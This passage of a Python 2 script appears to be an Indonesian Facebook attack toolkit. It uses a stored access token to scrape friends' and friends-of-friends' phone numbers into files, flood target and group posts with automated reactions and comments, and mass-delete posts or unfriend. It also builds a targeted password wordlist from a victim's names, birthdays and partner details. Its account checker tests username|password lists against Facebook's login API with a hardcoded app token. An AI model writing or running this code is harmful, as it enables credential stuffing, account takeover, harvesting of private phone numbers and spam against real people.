            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Bot Reactions Target Post'
    print '║-> \x1b[1;37;40m2. Bot Reactions Group Post'
    print '║-> \x1b[1;37;40m3. Bot Comment Target Post'
    print '║-> \x1b[1;37;40m4. Bot Comment Group Post'
    print '║-> \x1b[1;37;40m5. Mass Delete Post'
    print '║-> \x1b[1;37;40m6. Accept Friend Requests'
    print '║-> \x1b[1;37;40m7. Unfriends'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    bot_pilih()


def bot_pilih():
    bots = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if bots == '':
        print '\x1b[1;91m[!] Can\'t empty'
        bot_pilih()
    else:
        if bots == '1':
            menu_react()
        else:
            if bots == '2':
                grup_react()
            else:
                if bots == '3':
                    bot_komen()
                else:
                    if bots == '4':
                        grup_komen()
                    else:
                        if bots == '5':
                            deletepost()
                        else:
                            if bots == '6':
                                accept()
                            else:
                                if bots == '7':
                                    unfriend()
                                else:
                                    if bots == '0':
                                        menu()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mnot found'
                                        bot_pilih()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. \x1b[1;97mLike'
    print '║-> \x1b[1;37;40m2. \x1b[1;97mLove'
    print '║-> \x1b[1;37;40m3. \x1b[1;97mWow'
    print '║-> \x1b[1;37;40m4. \x1b[1;97mHaha'
    print '║-> \x1b[1;37;40m5. \x1b[1;97mSad'
    print '║-> \x1b[1;37;40m6. \x1b[1;97mAngry'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Can\'t empty'
        react_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            react()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                react()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    react()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        react()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            react()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                react()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mnot found'
                                    react_pilih()


def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. \x1b[1;97mLike'
    print '║-> \x1b[1;37;40m2. \x1b[1;97mLove'
    print '║-> \x1b[1;37;40m3. \x1b[1;97mWow'
    print '║-> \x1b[1;37;40m4. \x1b[1;97mHaha'
    print '║-> \x1b[1;37;40m5. \x1b[1;97mSad'
    print '║-> \x1b[1;37;40m6. \x1b[1;97mAngry'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if aksi == '':
        print '\x1b[1;91m[!] Can\'t empty'
        reactg_pilih()
    else:
        if aksi == '1':
            tipe = 'LIKE'
            reactg()
        else:
            if aksi == '2':
                tipe = 'LOVE'
                reactg()
            else:
                if aksi == '3':
                    tipe = 'WOW'
                    reactg()
                else:
                    if aksi == '4':
                        tipe = 'HAHA'
                        reactg()
                    else:
                        if aksi == '5':
                            tipe = 'SAD'
                            reactg()
                        else:
                            if aksi == '6':
                                tipe = 'ANGRY'
                                reactg()
                            else:
                                if aksi == '0':
                                    menu_bot()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mnot found'
                                    reactg_pilih()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(reaksigrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mUse \x1b[1;97m'<>' \x1b[1;92m for newline"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments  \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(komen))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group  \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Finish \x1b[1;96m' + str(len(komengrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mFrom \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mStarting remove status\x1b[1;97m ...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mFailed'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mRemoved'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Connection Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    friends = json.loads(r.text)
    if '[]' in str(friends['data']):
        print '\x1b[1;91m[!] No friends request'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Failed'
            print 52 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;91m[+] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print 52 * '\x1b[1;97m\xe2\x95\x90'

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92mRemove\x1b[1;97m] ' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_bot()


def lain():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Write Status'
    print '║-> \x1b[1;37;40m2. Make Wordlist'
    print '║-> \x1b[1;37;40m3. Account Checker'
    print '║-> \x1b[1;37;40m4. List Group'
    print '║-> \x1b[1;37;40m5. Profile Guard'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    pilih_lain()


def pilih_lain():
    other = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if other == '':
        print '\x1b[1;91m[!] Can\'t empty'
        pilih_lain()
    else:
        if other == '1':
            status()
        else:
            if other == '2':
                wordlist()
            else:
                if other == '3':
                    check_akun()
                else:
                    if other == '4':
                        grupsaya()
                    else:
                        if other == '5':
                            guard()
                        else:
                            if other == '0':
                                menu()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + other + ' \x1b[1;91mnot found'
                                pilih_lain()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mWrite status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91m[!] Can\'t empty'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mName Depan \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mName Tengah \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mName Belakang \x1b[1;97m: ')
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan \x1b[1;97m: ')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mName Pacar \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mName Panggilan Pacar \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername|password'
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mDie\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
